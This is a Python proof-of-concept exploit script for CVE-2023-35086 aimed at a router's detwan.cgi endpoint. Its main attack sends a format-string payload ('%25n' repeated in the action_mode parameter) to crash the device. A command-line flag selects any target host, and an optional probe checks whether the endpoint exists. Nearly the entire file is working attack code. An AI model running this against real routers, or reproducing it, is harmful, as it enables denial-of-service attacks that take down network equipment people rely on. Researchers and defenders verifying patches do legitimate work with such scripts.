#!/usr/bin/env python
import socket
import sys
import time
import hexdump
import argparse

CVE = "CVE-2023-35086"

def recvuntil(s, recv_msg, timeout=20):
  data = ''
  tmp_data = '1'
  while recv_msg not in data and tmp_data != '' :
    tmp_data = recv(s, timeout)
    data += tmp_data
  return recv_msg in data, data


def recv(s, timeout=20):
  tmp_data = '1'
  data = ''
  try :
    while tmp_data != '' :
      s.settimeout(timeout)
      tmp_data = s.recv(1024*8).decode('utf-8')
      data += tmp_data
  except socket.timeout :
    pass
  return data 


def header(action_mode):
  buff = ""
  buff += f"GET /detwan.cgi?action_mode={action_mode} HTTP/1.1\r\n"
  buff += "Host: {}:{}\r\n".format(HOST, PORT)
  buff += "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\r\n"
  buff += "Accept: */*\r\n"
  buff += "Accept-Language: en-US,en;q=0.5\r\n"
  buff += "Accept-Encoding: gzip, deflate\r\n"
  buff += "Connection: keep-alive\r\n"
  buff += "Referer: http://{}:{}/\r\n".format(HOST, PORT)
  buff += "Sec-GPC: 1\r\n"
  buff += "Origin: http://{}:{}\r\n".format(HOST, PORT)
  buff += "Pragma: no-cache\r\n"
  buff += "Cache-Control: no-cache\r\n"
  return buff

def dos():
  return header("%25n"*20)

def test():
  return header("GetWanStatus")


if __name__ == "__main__" :
  parser = argparse.ArgumentParser()
  parser.add_argument(
    "--HOST", 
    required=True,
    help="Ip router",
  )
  parser.add_argument(
    "--PORT", 
    required=True,
    type=int,
    help="Port router",
  )
  parser.add_argument(
    "--verbose", 
    default=False,
    action="store_true",
    help="Verbose mode"
  )
  parser.add_argument(
    "--test", 
    default=False,
    action="store_true",
    help="Do a valid request to check if detwan.cgi function is supported"
  )
  parser.add_argument(
    "--dos", 
    default=False,
    action="store_true",
    help="Exploit the vuln to achieve DoS",
  )

  args = parser.parse_args()
  HOST = args.HOST
  PORT = args.PORT

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, PORT))

  if args.test :
    buff = test().encode('ascii')
    s.send(buff)
    recv_msg = "{ \"state\":"
    found, body = recvuntil(s, recv_msg)
    if found :
      print("[+] Target supports detwan.cgi")
    else :
      print("[X] Target doesn't seem to support detwan.cgi")

    if args.verbose :
      print(body)

  elif args.dos :
    buff = dos().encode('ascii')
    s.send(buff)
    recv_msg = "HTTP/1.0 200 Ok"
    found, body = recvuntil(s, recv_msg)
    if found :
      print("[+] Target is NOT vulnerable")
    else :
      print(f"[!] Target does seem to be vulnerable to {CVE}.")

    if args.verbose :
      print(body)

  sys.exit(0)

